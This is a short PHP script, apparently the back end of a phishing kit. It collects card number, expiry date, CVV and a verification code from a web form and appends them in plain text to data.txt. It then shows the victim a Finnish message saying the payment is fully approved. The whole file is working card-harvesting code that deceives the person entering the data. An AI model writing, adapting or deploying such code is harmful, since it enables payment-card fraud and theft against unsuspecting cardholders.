	<?php
$card_number = $_POST['card_number'];
$card_expiry = $_POST['card_expiry'];
$card_cvv = $_POST['card_cvv'];
$verification_code = $_POST['verification_code'];

// Opslaan in een bestand
file_put_contents('data.txt', "Kortti: $card_number | Käyttöaika: $card_expiry | CVV: $card_cvv | Vahvistuskoodi: $verification_code\n", FILE_APPEND);

echo "<h2>Täysin hyväksytty!</h2>";
echo "<p>Tiedot on tallennettu.</p>";
?>